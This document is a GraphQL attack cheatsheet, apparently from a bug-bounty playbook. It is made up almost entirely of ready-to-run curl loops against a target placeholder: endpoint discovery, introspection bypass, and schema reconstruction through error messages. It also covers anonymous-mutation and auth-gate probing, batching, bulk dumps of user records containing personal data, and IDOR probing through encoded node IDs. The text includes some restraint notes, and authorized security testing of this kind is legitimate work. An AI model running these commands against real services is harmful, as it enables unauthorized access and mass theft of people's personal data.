# GraphQL Cheatsheet: introspection, error-oracle schema reconstruction, auth matrices, mass dumps

GraphQL surfaces get their own command set because the probing is structurally different from REST: one endpoint, verb-shaped documents, per-operation gates. Pairs with playbook class 20.

## 1. Endpoint discovery

```bash
# common paths (probe each with a minimal POST)
for p in graphql graphql/v1 api/graphql api/v1/graphql public/graphql /public/api/graphql query gql; do
  printf '%s -> ' "$p"
  curl -s -o /dev/null -w '%{http_code}\n' -X POST "https://<TARGET>/$p" -H 'Content-Type: application/json' -d '{"query":"{__typename}"}'
done
```

`{"data":{"__typename":"..."}}` = live endpoint. Also mine the JS corpus and APK strings for literal graphql URLs (per-service paths like /xxx/graphql are the norm; 19 services on one host was real).

## 2. Introspection probe (and the blocked variant)

```bash
curl -s -X POST 'https://<TARGET>/graphql' -H 'Content-Type: application/json' -d '{"query":"{__schema{types{name}}"}' | head -c 600
# full field dump when open:
curl -s -X POST 'https://<TARGET>/graphql' -H 'Content-Type: application/json' -d '{"query":"{__schema{queryType{name} mutationType{name} types{name kind fields{name type{name kind ofType{name}}}}}}"}' > introspection.json
# __type by name (often works where __schema is blocked, especially on /public siblings):
curl -s -X POST 'https://<TARGET>/public/graphql' -H 'Content-Type: application/json' -d '{"query":"{__type(name:\"Query\"){fields{name}}"}'
```

Blocked with "access denied" but field errors still leak = go to section 3.

## 3. Error-oracle schema reconstruction (works on introspection-blocked gateways)

The validation error "Cannot query field X. Did you mean Y, Z?" leaks the 3 closest real field names per probe. Iterate the loop:

```bash
# probe any nonsense field; read the suggestions
curl -s -X POST 'https://<TARGET>/api/xxx/graphql' -H 'Content-Type: application/json' -d '{"query":"{ zzzzz }"}'
# follow a suggestion; wrong-arg errors name the required args and their types
curl -s -X POST 'https://<TARGET>/api/xxx/graphql' -H 'Content-Type: application/json' -d '{"query":"{ threads { id } }"}'
# "argument input of type ThreadPropAggrInput! is required" -> probe the input shape the same way
curl -s -X POST 'https://<TARGET>/api/xxx/graphql' -H 'Content-Type: application/json' -d '{"query":"mutation { updateThreadPropAggr(input: {zz: 1}) { id } }"}'
```

Wrong inner fields return "In field zz: Unknown field" with the same 3-suggestion leak one level down. A full mutation input shape was reconstructed this way on a gateway where __schema was blocked; then the first anonymous mutation write executed with the reconstructed shape. Script the iteration (a 20-line python loop over suggestions halves the time).

## 4. Per-service, per-operation auth matrix (a host is not a verdict)

```bash
M='{__typename}'
for svc in xxx yyy forum chat; do
  for op in '{ forumThreads { id } }' 'mutation { markSeen(id: 1) { id } }'; do
    printf '%s [%s] noauth: ' "$svc" "$op"
    curl -s -o /dev/null -w '%{http_code} ' -X POST "https://<TARGET>/$svc/graphql" -H 'Content-Type: application/json' -d "{\"query\":\"$op\"}"
    printf 'bad: '
    curl -s -o /dev/null -w '%{http_code}\n' -X POST "https://<TARGET>/$svc/graphql" -H 'Content-Type: application/json' -H 'Authorization: Bearer aaaa.bbbb.cccc' -d "{\"query\":\"$M\"}"
  done
done
```

Watch for: in-band 200 with `{"message":"Unauthorized"}` (GraphQL-style gate), full anonymous 200, 302 redirect (REST-style gate). Query-public + mutation-open on the same service was real; probe /public/ siblings of every service path.

## 5. Batching and rate-limit abuse (bounded, minimization respected)

```bash
# batched query (5 ops in one request; only where the target accepts arrays)
curl -s -X POST 'https://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '[{"query":"{ node(id:1){id} }"},{"query":"{ node(id:2){id} }"},{"query":"{ node(id:3){id} }"}]' | head -c 400
```

## 6. Mass dump via the no-arg test (before writing pagination loops)

```bash
# check the app's own call-site for page/pageSize args; if absent, test the no-arg variant:
curl -s -X POST 'https://<TARGET>/report/graphql' -H 'Content-Type: application/json' -H 'Authorization: Bearer <TOKEN>' \
  -d '{"query":"{ reportBookmarks { id userId note } }"}' -o dump.json
wc -c dump.json
# read-back with the second account to rule out per-user caching:
curl -s -X POST 'https://<TARGET>/report/graphql' -H 'Content-Type: application/json' -H 'Authorization: Bearer <B-TOKEN>' \
  -d '{"query":"{ reportBookmarks { id userId note } }"}' -o dump_b.json
cmp dump.json dump_b.json && echo IDENTICAL-cross-account || echo DIFFERS
```

A 29.6MB single response with 195K records was real: the raw file IS the scale evidence; parse locally with rh_impact.py (record count, distinct users, PII population), never dump-and-hoard beyond the minimum.

## 7. Node/id probing (relay-style globals)

```bash
# base64 GID construction (gid://<Type>/<id>)
python3 -c "import base64; print(base64.b64encode(b'gid://Order/1001').decode())"
curl -s -X POST 'https://<TARGET>/graphql' -H 'Content-Type: application/json' -H 'Authorization: Bearer <TOKEN>' \
  -d '{"query":"{ node(id: \"<B64-GID>\") { id ... on Order { customer { name email } } } }"}'
```

Sequential ids inside the GID = the IDOR range probe transposed to GraphQL.

## 8. Depth/complexity probes (bounded)

```bash
# self-referential depth (3 levels is enough to demonstrate unbounded nesting; do not fire deep bombs)
curl -s -X POST 'https://<TARGET>/graphql' -H 'Content-Type: application/json' \
  -d '{"query":"{ users(first:1){ edges{ node{ friends(first:1){ edges{ node{ friends(first:1){ edges{ node{ id } } } } } } } } } }"}' | head -c 300
```

Report what the 3-level response proves (no depth limit observable at 3) with timing; deep-bombing is DoS territory, out of the line.
